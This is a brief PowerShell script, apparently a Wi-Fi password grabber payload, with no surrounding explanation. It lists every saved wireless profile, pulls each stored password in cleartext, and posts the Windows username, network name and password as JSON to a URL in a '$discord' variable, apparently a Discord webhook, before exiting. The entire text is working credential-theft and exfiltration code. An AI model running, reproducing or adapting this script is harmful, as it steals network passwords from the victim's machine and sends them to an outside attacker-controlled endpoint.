netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object { $wlan = $_.Matches.Value; if (netsh wlan show profile $wlan key=clear | Select-String 'Security key\s+:\sPresent') { $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'; $Body = @{'username' = $env:username + " | " + [string]$wlan; 'content' = [string]$passw}; Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)}}

exit
